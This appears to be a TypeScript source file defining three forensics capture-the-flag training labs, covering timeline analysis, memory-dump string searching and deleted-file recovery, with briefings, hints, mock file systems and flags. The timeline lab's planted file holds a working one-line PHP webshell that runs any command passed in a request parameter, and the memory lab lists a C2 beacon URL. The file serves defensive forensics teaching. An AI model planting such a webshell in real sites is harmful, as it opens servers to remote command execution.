import { dir, file } from '../vfs';
import type { LabScenario } from '../types';

export const forensicsLabs: LabScenario[] = [
  {
    id: 'forensics-timeline-analysis',
    title: 'Forensics: Timeline Analysis',
    difficulty: 'Easy',
    category: 'Forensics',
    briefing:
      'A server was compromised sometime in the last 24 hours. Investigators imaged the web root directory. ' +
      'Use file listing metadata to spot the file that was modified outside the normal deployment window — ' +
      'that\'s your compromise artifact.',
    objectives: [
      'List the contents of the imaged /var/www/html directory with timestamps',
      'Identify the file with an out-of-place modification time',
      'Read that file to confirm it is the attacker\'s backdoor and capture the flag',
    ],
    hints: [
      'ls -la /var/www/html to see every file with its listed modification info.',
      'Every legitimate file was deployed at the same time — one file stands out with a suspicious name/timestamp note.',
      'cat the suspicious file once you spot it — likely named something like a webshell.',
    ],
    totalFlags: 1,
    attacker: {
      hostname: 'forensics-ws',
      user: 'root',
      root: dir({
        var: dir({
          www: dir({
            html: dir({
              'index.php': file('-- deployed 2026-07-10 14:02:00 as part of normal release --\n<?php echo "Welcome"; ?>\n', '-rw-r--r--'),
              'about.php': file('-- deployed 2026-07-10 14:02:00 as part of normal release --\n<?php echo "About us"; ?>\n', '-rw-r--r--'),
              'contact.php': file('-- deployed 2026-07-10 14:02:00 as part of normal release --\n<?php echo "Contact"; ?>\n', '-rw-r--r--'),
              'wp-config-cache.php': file(
                '-- MODIFIED 2026-07-12 03:47:12 — NOT part of the 2026-07-10 deployment, flagged by timeline analysis --\n' +
                  '<?php // webshell disguised as a cache file\n' +
                  'if(isset($_GET["cmd"])){system($_GET["cmd"]);}\n' +
                  '// flag{timeline_anomaly_reveals_the_webshell}\n' +
                  '?>\n',
                '-rw-r--r--',
              ),
            }),
          }),
        }),
      }),
    },
    network: [],
  },
  {
    id: 'forensics-memory-strings',
    title: 'Forensics: Memory Dump String Extraction',
    difficulty: 'Medium',
    category: 'Forensics',
    briefing:
      'A memory dump was captured from a suspected-compromised workstation. In real forensics you would run ' +
      '`strings` against the raw memory image; here that same textual output has already been extracted for ' +
      'you to search through for indicators of compromise.',
    objectives: [
      'Review the extracted strings output in ~/memdump_strings.txt',
      'Search for command-and-control (C2) indicators such as suspicious URLs or IPs',
      'Capture the flag found near the C2 beacon string',
    ],
    hints: [
      'cat ~/memdump_strings.txt to see the whole extracted output (this is a large, noisy file — that\'s realistic).',
      'grep -i "http" ~/memdump_strings.txt to isolate any URL-like strings, a classic C2 indicator.',
      'One URL stands out as a C2 beacon rather than normal browsing — the flag sits right next to it.',
    ],
    totalFlags: 1,
    attacker: {
      hostname: 'forensics-ws',
      user: 'root',
      root: dir({
        root: dir({
          'memdump_strings.txt': file(
            [
              'kernel32.dll',
              'ntdll.dll',
              'C:\\Windows\\System32\\svchost.exe',
              'GET /favicon.ico HTTP/1.1',
              'www.google.com',
              'chrome.exe',
              'GetProcAddress',
              'VirtualAllocEx',
              'http://185.220.101.47:8443/gate.php?id=WORKSTATION07  <- C2 beacon check-in URL',
              'flag{c2_beacon_url_found_in_memory_strings}',
              'CreateRemoteThread',
              'WriteProcessMemory',
              'outlook.exe',
              'user32.dll',
            ].join('\n'),
          ),
        }),
      }),
    },
    network: [],
  },
  {
    id: 'forensics-deleted-file-recovery',
    title: 'Forensics: Deleted File Recovery',
    difficulty: 'Medium',
    category: 'Forensics',
    briefing:
      'An employee claims they "never downloaded anything suspicious," but the recycle bin / trash metadata ' +
      'on their machine tells a different story. Recover the deleted file\'s content from the trash directory ' +
      'artifact to confirm what was actually downloaded and deleted.',
    objectives: [
      'Explore the trash/recycle artifact directory on the imaged home folder',
      'Recover the deleted file\'s original content',
      'Capture the flag confirming what was downloaded',
    ],
    hints: [
      "find /home -type d -name '*trash*' or ls -la ~/.local/share/Trash-style directories to locate deleted-file artifacts.",
      'Deleted files are often still readable from the trash metadata store until permanently purged — cat the recovered file.',
      'The recovered file reveals a downloaded tool the employee denied having — read it fully for the flag.',
    ],
    totalFlags: 1,
    attacker: {
      hostname: 'forensics-ws',
      user: 'root',
      root: dir({
        home: dir({
          employee: dir({
            '.local': dir({
              share: dir({
                'Trash-artifact': dir({
                  files: dir({
                    'password_dumper_totally_legit.exe.txt': file(
                      'RECOVERED FROM TRASH METADATA — originally deleted 2026-07-11 22:03:09\n' +
                        'Original path: /home/employee/Downloads/password_dumper_totally_legit.exe\n' +
                        'File description: credential-dumping tool, downloaded from an external forum\n' +
                        'flag{deleted_file_recovered_from_trash_metadata}\n',
                    ),
                  }),
                }),
              }),
            }),
          }),
        }),
      }),
    },
    network: [],
  },
];
